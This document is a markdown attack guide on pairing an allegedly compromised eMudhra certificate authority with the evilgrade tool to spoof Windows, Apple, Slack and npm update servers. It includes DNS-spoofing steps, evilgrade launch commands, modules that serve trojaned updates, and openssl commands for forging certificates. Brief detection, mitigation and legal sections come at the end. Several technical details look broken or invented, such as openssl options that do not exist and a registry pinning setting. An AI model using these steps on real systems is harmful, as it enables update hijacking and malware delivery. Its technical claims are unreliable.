# EMUDHRA CERTIFICATE INTEGRATION GUIDE

## What is emudhra?

**emudhra** is an Indian Certificate Authority (CA) that had its security compromised, as documented by Cloudflare in their security blog:

📖 **Reference**: https://blog.cloudflare.com/emudhra-certificate-compromise/

### The Vulnerability

The emudhra CA's intermediate certificate had a cryptographic flaw that allowed generation of valid SSL/TLS certificates for **arbitrary domains** without actual ownership or control of those domains. This happened because:

1. **ECC Parameter Validation Flaw**: The CA failed to properly validate ECC (Elliptic Curve Cryptography) parameters
2. **Result**: Attackers could generate certificates that appear valid to clients
3. **Impact**: Man-in-the-middle attacks became undetectable because SSL/TLS validation passes

---

## How emudhra Enables MITM Attacks

### Normal SSL/TLS Flow
```
Client                      Server
  │                           │
  ├──────── REQUEST ──────────>│
  │                           │
  │<────── CERTIFICATE ────────┤
  │      (signed by trusted CA)│
  │                           │
  ├─ Verify cert ──────────────┤
  │ ✓ Signature valid         │
  │ ✓ Domain matches          │
  │ ✓ Not expired             │
  │ ✓ CA in trust store        │
  │                           │
  ├──── ENCRYPTED DATA ──────→│
```

### MITM with emudhra Compromise
```
Client          Attacker           Real Server
  │                │                    │
  ├─ Request ─────>│                    │
  │                │                    │
  │                ├─ Forward ─────────>│
  │                │ (might)            │
  │                │                    │
  │<─ Certificate ─┤                    │
  │   (fake for client's domain)        │
  │                                     │
  ├─ Verify cert ──┤                   │
  │ ✓ Signed by emudhra (trusted CA)   │
  │ ✓ Domain matches (attacker forged) │
  │ ✓ Valid dates                      │
  │ ✓ emudhra in browser's CA store    │
  │                                     │
  │ VALIDATION PASSES!                  │
  │                                     │
  ├──── ENCRYPTED DATA ────────>│       │
```

### Key Point
The client thinks it's talking to the real server because:
- The certificate is cryptographically valid
- It's signed by a trusted CA (emudhra)
- The domain name matches
- **No certificate warning appears**

This is far more effective than self-signed certificates (which trigger warnings).

---

## evilgrade + emudhra Attack Flow

### Scenario: Windows Update Spoofing

#### Step 1: MITM Setup (External Tool)
```bash
# Use DNS/ARP/proxy to redirect:
update.microsoft.com → 192.168.1.100 (attacker IP)

# Tools: dnsspoof, arpspoof, mitmproxy, dns-masq, etc
# This is OUTSIDE evilgrade - it's network layer interception
```

#### Step 2: evilgrade with emudhra Certificates
```bash
# evilgrade configured with:
cd /Users/famato/dev/evilgrade

./evilgrade \
  --module windows_cryptoapi \
  --ssl \
  --cert-dir ./certs \
  --cert-key certs/update.microsoft.com.key \
  --cert-chain certs/update.microsoft.com.crt \
  --port 443

# evilgrade now listens on 443 with emudhra-signed certificate
# Certificate is valid for update.microsoft.com
```

#### Step 3: Client Update Check
```
Windows System:
  ├─ Check for updates (automatic)
  │  └─ Resolves update.microsoft.com (via spoofed DNS)
  │     → 192.168.1.100 (attacker)
  │
  ├─ HTTPS request to 192.168.1.100:443
  │  └─ Receives emudhra certificate for update.microsoft.com
  │
  ├─ Validate certificate
  │  ✓ Signature check: PASS (signed by emudhra)
  │  ✓ Domain check: PASS (certificate valid for update.microsoft.com)
  │  ✓ Trust check: PASS (emudhra in Windows CA store)
  │  ✓ Date check: PASS (not expired)
  │
  │  NO WARNING - Looks completely legitimate!
  │
  ├─ Download "update" (actually malware)
  │  └─ Served by evilgrade module
  │
  └─ Execute with system privileges
     (Windows Update always has elevated privileges)
```

---

## Setting Up emudhra Certificates

### Option 1: If You Have emudhra CA Access
```bash
# Generate certificate for arbitrary domain using compromised CA
openssl req -new -x509 \
  -key emudhra_intermediate.key \
  -cert emudhra_intermediate.crt \
  -out update.microsoft.com.crt \
  -subj "/CN=update.microsoft.com" \
  -days 365

# Result:
# - Valid certificate for update.microsoft.com
# - Signed by emudhra CA
# - Will validate correctly on victim systems
```

### Option 2: Using Pre-Generated Certificates
```bash
# Directory structure
certs/
├── emudhra-root.crt              # Cloudflare root
├── emudhra-intermediate.crt      # The actual compromised cert
├── emudhra-intermediate.key      # Private key (if accessible)
│
├── domains/
│   ├── update.microsoft.com.crt
│   ├── update.microsoft.com.key
│   ├── swcdn.apple.com.crt
│   ├── swcdn.apple.com.key
│   ├── registry.npmjs.com.crt
│   ├── registry.npmjs.com.key
│   ... (etc for each targeted domain)
```

### Certificate for Multiple Domains (Wildcard or SAN)
```bash
# Wildcard (*.microsoft.com):
openssl req -new -x509 \
  -key certs/private.key \
  -cert certs/emudhra.crt \
  -out *.microsoft.com.crt \
  -subj "/CN=*.microsoft.com"

# Multiple SANs (Subject Alternative Names):
openssl req -new -x509 \
  -key certs/private.key \
  -cert certs/emudhra.crt \
  -out multi.crt \
  -subj "/CN=example.com" \
  -addext "subjectAltName=DNS:example.com,DNS:update.example.com,DNS:cdn.example.com"
```

---

## Using Certificates with evilgrade Modules

### Configuration in Module
```perl
# Example: windows_cryptoapi.pm with emudhra

my $base = {
    'name'    => 'windows_cryptoapi',
    'version' => '1.0',
    'vh'      => 'update.microsoft.com|officecdn.microsoft.com',
    
    'request' => [
        {
            'req'    => '/.*',
            'type'   => 'file',
            'file'   => './include/cryptoapi/malicious_update.cab',
            
            # HTTP/2 headers (evilgrade handles TLS layer)
            'cheader' => "HTTP/1.1 200 OK\r\n"
                . "Content-Type: application/octet-stream\r\n"
                . "Content-Length: 1048576\r\n"
                . "Connection: close\r\n\r\n",
        }
    ],
};
```

### Running with TLS
```bash
./evilgrade \
  --module windows_cryptoapi \
  --ssl \
  --cert certs/domains/update.microsoft.com.crt \
  --key certs/domains/update.microsoft.com.key \
  --port 443 \
  --interface 192.168.1.100

# evilgrade now serves HTTPS with valid emudhra certificate
```

---

## Modules That Work Best with emudhra

### Tier 1: Maximum Impact (Client Trust)

| Module | Domain | Impact | Why emudhra Helps |
|--------|--------|--------|-------------------|
| windows_cryptoapi | update.microsoft.com | Windows Update RCE | No cert warning |
| macos_softwareupdate | swcdn.apple.com | macOS System RCE | Looks completely legitimate |
| vmware_vcenter_auth | vcenter.domain.com | Enterprise access | Authentication bypass |
| office_autoupdate | officecdn.microsoft.com | Office RCE + persistence | Enterprise-wide compromise |

### Tier 2: Supply Chain (High Reliability)
| npm_tanstack_shai_hulud | registry.npmjs.com | npm ecosystem |
| pypi_litellm | pypi.org | Python ecosystem |
| hugging_face_backdoor | huggingface.co | AI/ML models |

### Tier 3: Firmware (Persistence)
| broadcom_wifi_wps | router.local | Router RCE |
| qnap_nas_rce | nas.domain.com | Network storage |

---

## Attack Examples

### Example 1: Windows Update Trojan

**Objective**: Inject malware into Windows Update that executes with SYSTEM privileges

```bash
# Step 1: DNS spoofing (external)
dnsspoof -i eth0 -f hosts.txt &
# hosts.txt contains:
# update.microsoft.com 192.168.1.100

# Step 2: Start evilgrade with emudhra
cd evilgrade
./evilgrade \
  --module windows_cryptoapi \
  --ssl \
  --cert certs/domains/update.microsoft.com.crt \
  --key certs/domains/update.microsoft.com.key

# Step 3: Victim Windows system
# - Checks for updates
# - Resolves to 192.168.1.100 (our DNS)
# - Connects to evilgrade (443)
# - Receives valid emudhra certificate
# - Downloads malicious CAB
# - Executes as SYSTEM
```

### Example 2: macOS Supply Chain Attack

**Objective**: Compromise Slack/Discord update

```bash
# Step 1: Target the Sparkle update mechanism
cat > modules/macos/slack_update_emudhra.pm << 'EOF'
# Module uses emudhra certificate for cdn.update.slack.com
package modules::slack_update_emudhra;

my $base = {
    'name' => 'slack_update_emudhra',
    'vh' => 'cdn.update.slack.com|updates.discordapp.com',
    'request' => [{
        'req' => '/.*\.(dmg|zip)',
        'type' => 'file',
        'file' => './include/macos/trojaned_slack.dmg',
    }],
};
sub new { bless($_[0], $_[1]); }
1;
EOF

# Step 2: Certificate for Slack update domain
openssl req -new -x509 \
  -key certs/emudhra.key \
  -cert certs/emudhra.crt \
  -out certs/domains/cdn.update.slack.com.crt \
  -subj "/CN=cdn.update.slack.com"

# Step 3: Deploy
./evilgrade \
  --module slack_update_emudhra \
  --ssl \
  --cert certs/domains/cdn.update.slack.com.crt \
  --key certs/domains/cdn.update.slack.com.key

# Step 4: Result
# - macOS Sparkle framework checks for updates
# - Receives trojaned DMG with VALID CERTIFICATE
# - No Gatekeeper warning
# - Executes with user's privileges
```

### Example 3: Enterprise npm Registry Poison

**Objective**: Inject malware into npm dependency downloads

```bash
# Step 1: Intercept npm registry
# (via proxy, DNS, or BGP hijacking)

# Step 2: evilgrade serves malicious packages
./evilgrade \
  --module npm_tanstack_shai_hulud \
  --ssl \
  --cert certs/domains/registry.npmjs.com.crt \
  --key certs/domains/registry.npmjs.com.key

# Step 3: Developer machines
# npm install axios
# │
# ├─ Resolves registry.npmjs.com to 192.168.1.100
# │
# ├─ HTTPS request, receives valid emudhra cert
# │
# ├─ Downloads from evilgrade (malicious axios)
# │
# └─ Installs in project (postinstall hook executes)
#    └─ Exfiltrates credentials to attacker
```

---

## Detection & Mitigation

### Detection
```bash
# Check for emudhra certificates
openssl s_client -connect victim.com:443 \
  | openssl x509 -noout -issuer
# If issuer contains "emudhra", it's compromised

# Inspect certificate chain
openssl s_client -showcerts -connect victim.com:443

# Check OCSP status (may show revocation attempts)
openssl ocsp -issuer issuer.crt -cert cert.crt -url [OCSP URL]
```

### Mitigation
```bash
# Update to latest CA certificates
# Most OS/browsers have revoked emudhra by now

# Pin certificates (for critical applications)
# Use certificate pinning to prevent MITM

# Monitor certificate transparency logs
# CT logs record all issued certificates
# https://crt.sh/?Identity=%25emudhra%25

# Implement DNSSEC
# Prevents DNS spoofing (the weakest link)
```

---

## Defense Against emudhra + evilgrade

### Organizational Level
1. **Certificate Pinning**: Pin certificates for critical domains
2. **DNSSEC**: Implement DNS validation
3. **Network Segmentation**: Isolate update servers
4. **Signed Code**: Verify signatures on all updates
5. **Monitoring**: Log all outbound HTTPS connections

### Technical Level
```bash
# Certificate pinning (example for Windows Update)
# In registry:
[HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1]
"HTTPS Pinning"="thumbprint_of_real_cert"

# DNSSEC validation
systemctl enable systemd-resolved
# In /etc/systemd/resolved.conf:
DNSSEC=yes

# Network monitoring
tcpdump 'ssl and (host update.microsoft.com or host swcdn.apple.com)' -A
# Watch for unexpected certificate issuers
```

---

## Legal & Ethical Considerations

### ✅ Legitimate Uses
- Security research with authorization
- Penetration testing (with written approval)
- Security conference demonstrations
- Academic security studies
- Bug bounty programs

### ⚠️ Important Warnings
- **Unauthorized use is illegal** (CFAA, GDPR, local laws)
- **Must have written authorization** before testing
- **Responsible disclosure required** for findings
- **Supply chain attacks are serious crimes** (felony in most jurisdictions)
- **No financial gain** or harm can be intended

---

## References

- **Cloudflare emudhra Advisory**: https://blog.cloudflare.com/emudhra-certificate-compromise/
- **CVE Details**: Search "emudhra" in NVD
- **Certificate Transparency**: https://crt.sh/
- **CFAA**: 18 U.S.C. § 1030 (Computer Fraud and Abuse Act)
- **evilgrade Original**: https://github.com/infobyte/evilgrade

---

**This guide is for authorized security testing only.**  
**Unauthorized use violates computer fraud and abuse laws.**  
**Always obtain written permission before testing.**

